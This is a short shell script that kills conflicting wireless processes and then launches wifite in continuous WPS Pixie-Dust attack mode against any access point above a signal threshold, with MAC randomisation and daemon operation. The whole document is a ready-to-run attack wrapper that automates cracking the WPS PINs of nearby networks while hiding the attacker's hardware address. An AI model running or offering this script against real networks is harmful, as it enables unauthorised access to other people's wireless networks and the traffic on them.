#!/bin/sh

if [ "$#" -ne 1 ]; then
	echo "Usage $0 <interface>"
	exit 1
fi
airmon-ng check kill
INTERFACE=$1
wifite --kill -i $INTERFACE -inf -p 7 --wps-only --random-mac --pixie --wps-time 45 --wps-fails 2 --wps-timeouts 2 --daemon -ic -pow 30;

